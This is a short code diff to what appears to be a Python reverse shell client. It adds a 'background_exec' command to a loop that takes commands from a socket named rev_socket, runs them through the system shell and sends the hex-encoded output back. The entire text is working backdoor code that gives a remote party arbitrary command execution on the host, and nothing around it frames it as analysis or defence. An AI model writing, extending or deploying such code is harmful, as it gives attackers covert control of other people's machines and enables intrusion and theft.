@@ -71,6 +71,11 @@ while True:
         rev_socket.send(hex_handler(prompt, encode=True))
         continue
 
+    if command.startswith('background_exec') and len(command.split()) >= 2:
+        background_exec = subprocess.Popen(command[15:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        rev_socket.send(hex_handler('\n', encode=True))
+        continue
+
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     try:
         stdout = output.stdout.read().decode()
